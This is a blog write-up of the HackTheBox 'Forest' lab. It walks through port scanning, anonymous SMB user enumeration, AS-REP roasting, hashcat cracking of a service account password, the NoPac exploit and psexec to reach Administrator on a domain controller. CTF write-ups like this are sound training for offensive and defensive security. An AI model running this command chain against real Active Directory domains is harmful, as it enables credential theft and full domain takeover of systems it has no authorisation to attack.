---
layout: post
title: "HackTheBox: Forest"
description: A writeup for HackTheBox Forest
date:   2024-10-06 21:18 +0530
image:  '/images/post/forest.jpg'
tags:   [HackTheBox,htb]
---

## Summary
> An easy box containing AD environment with vulnerabilities like :
- Kerberose Asreproast
- NOPac Vulnerability (NoPac relies on changing the SamAccountName of a computer account to the name of a domain controller)

***
## Setup
`mkdir -p ~/ctf/HackTheBox/forest/scans; cd ~/ctf/HackTheBox/forest`
IP Address: 10.10.10.161


`echo "10.10.10.161 forest.htb" | sudo tee -a /etc/hosts`
10.10.10.161 forest.htb
***
### Enumeration 

`nmap -sC -sV -Pn -p- forest.htb -oN scans/nmap -vv`
`nmap -sC -sV -p- -vv -T5 --min-rate 2500 -oN scans/nmap_2 forest.htb`
```
# nmap findings
Initiating Connect Scan at 21:22
Scanning forest.htb (10.10.10.161) [65535 ports]
Discovered open port 139/tcp on 10.10.10.161
Discovered open port 135/tcp on 10.10.10.161
Discovered open port 53/tcp on 10.10.10.161
Discovered open port 445/tcp on 10.10.10.161
Discovered open port 47001/tcp on 10.10.10.161
Discovered open port 49678/tcp on 10.10.10.161
Discovered open port 49671/tcp on 10.10.10.161
Discovered open port 3268/tcp on 10.10.10.161
Discovered open port 49665/tcp on 10.10.10.161
Discovered open port 464/tcp on 10.10.10.161
Discovered open port 5985/tcp on 10.10.10.161
Discovered open port 9389/tcp on 10.10.10.161
Discovered open port 49664/tcp on 10.10.10.161
Discovered open port 49705/tcp on 10.10.10.161
Discovered open port 49974/tcp on 10.10.10.161
Discovered open port 3269/tcp on 10.10.10.161
Discovered open port 389/tcp on 10.10.10.161
Discovered open port 49666/tcp on 10.10.10.161
Discovered open port 636/tcp on 10.10.10.161
Discovered open port 49667/tcp on 10.10.10.161
Discovered open port 49679/tcp on 10.10.10.161
Discovered open port 593/tcp on 10.10.10.161
Discovered open port 49686/tcp on 10.10.10.161
Discovered open port 88/tcp on 10.10.10.161
Completed Connect Scan at 21:22, 49.67s elapsed (65535 total ports)
Initiating Service scan at 21:22
Scanning 24 services on forest.htb (10.10.10.161)
Stats: 0:01:21 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 62.50% done; ETC: 21:23 (0:00:19 remaining)
Stats: 0:01:29 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 62.50% done; ETC: 21:23 (0:00:23 remaining)
Stats: 0:01:34 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 62.50% done; ETC: 21:24 (0:00:26 remaining)
Completed Service scan at 21:23, 55.00s elapsed (24 services on 1 host)
NSE: Script scanning 10.10.10.161.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:23
Completed NSE at 21:24, 10.75s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:24
Completed NSE at 21:24, 2.24s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:24
Completed NSE at 21:24, 0.00s elapsed
Nmap scan report for forest.htb (10.10.10.161)
Host is up, received user-set (0.078s latency).
Scanned at 2024-10-06 21:22:05 IST for 118s
Not shown: 65511 closed tcp ports (conn-refused)
PORT      STATE SERVICE      REASON  VERSION
53/tcp    open  domain       syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2024-10-06 15:48:22Z)
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack
593/tcp   open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack
3268/tcp  open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack
5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       syn-ack .NET Message Framing
47001/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        syn-ack Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack Microsoft Windows RPC
49671/tcp open  msrpc        syn-ack Microsoft Windows RPC
49678/tcp open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
49679/tcp open  msrpc        syn-ack Microsoft Windows RPC
49686/tcp open  msrpc        syn-ack Microsoft Windows RPC
49705/tcp open  msrpc        syn-ack Microsoft Windows RPC
49974/tcp open  msrpc        syn-ack Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2024-10-06T08:49:15-07:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 32753/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 57085/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 44587/udp): CLEAN (Timeout)
|   Check 4 (port 2270/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2024-10-06T15:49:15
|_  start_date: 2024-10-06T08:20:41
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2h15m22s, deviation: 4h02m31s, median: -4m39s

```

Using SMB enumeration  using crackmapexec and null account anonymous login we enumerate users
`cme smb 10.10.10.161 -u '' -p '' --users`

```
Administrator
Guest
krbtgt
DefaultAccount
$331000-VK4ADACQNUCA
SM_2c8eef0a09b545acb
SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
SM_681f53d4942840e18
SM_1b41c9286325456bb
SM_9b69f1b9d2cc45549
SM_7c96b981967141ebb
SM_c75ee099d0a64c91b
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailbox83d6781
HealthMailboxfd87238
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
sebastien
lucinda
svc-alfresco
andy
marks
santi
```

![f32fb1277162d620b2c614d7d69ad79f.png]({{site.baseurl}}/images/post/f32fb1277162d620b2c614d7d69ad79f.png)

[password spraying and bruteforcing didnt work (Same password as username) ]

### Kerberos ASREPRoast
asreproast is a user accounts with Kerberos pre-authentication required attribute not set. This allows attackers to request authentication for a user from the Domain Controller (DC) without needing the user's password. The DC then responds with a message encrypted with the user's password-derived key, which attackers can attempt to crack offline to discover the user's password.

`GetNPUsers.py htb.local/ -usersfile user -format hashcat -outputfile hash_asrep -no-pass`

![37bf4692a955d58517b6567498194c39.png]({{site.baseurl}}/images/post/37bf4692a955d58517b6567498194c39.png)

Cracking the hash using `hashcat -m 18200 hash_asrep /usr/share/wordlists/rockyou.txt`

![b17b25a33034a49eeb4e455c8e08ec9a.png]({{site.baseurl}}/images/post/b17b25a33034a49eeb4e455c8e08ec9a.png)

we get `svc-alfresco:s3rvice`
We check for known low hanging fruits like Nopac and Petitpotam
![b0a5e1ffb20973140130d63699d0b0ec.png]({{site.baseurl}}/images/post/b0a5e1ffb20973140130d63699d0b0ec.png)


# root flag

### Credential Cache
A credential cache (or “ccache”) contains the Kerberos credential although it remains valid and, typically, while the user’s session lasts, so that multiple service authentication (e.g. connecting to a web or mail server more than once) does not involve contacting the KDC at every time.

A credential cache usually contains one initial ticket which is obtained using a password or another form of identity verification. If this ticket is a ticket-granting ticket, it can be used to obtain additional credentials without the password. Because the credential cache does not store the password, less long-term damage can be done to the user’s account if the machine is compromised.

A credentials cache stores a default client principal name, set when the cache is created. This is the name shown at the top of the klist

Using [No Pac](https://github.com/Ridter/noPac)
`python noPac.py htb.local/'svc-alfresco':'s3rvice' -dc-ip 10.10.10.161 -use-ldap`
![83e90f4d38637d490fb696fca5aed615.png]({{site.baseurl}}/images/post/83e90f4d38637d490fb696fca5aed615.png) we get kerboros ticket

using psexec.py `psexec.py -dc-ip 10.10.10.161 -target-ip 10.10.10.161 -no-pass -k htb.local/Administrator@forest.htb.local`

![2114cac3e03095d86da641cfa41a847a.png]({{site.baseurl}}/images/post/2114cac3e03095d86da641cfa41a847a.png)




***
## Wrap Up
- In this "Forest" box, enumeration reveals a Windows Active Directory environment with common services exposed, such as Kerberos and LDAP. Using ASREPRoasting, we cracked the password for the svc-alfresco account, leading to exploitation via the NoPac vulnerability, which allowed privilege escalation by obtaining a Kerberos ticket. With this, we achieved administrator access to the Domain Controller, eventually obtaining the root flag through a psexec connection
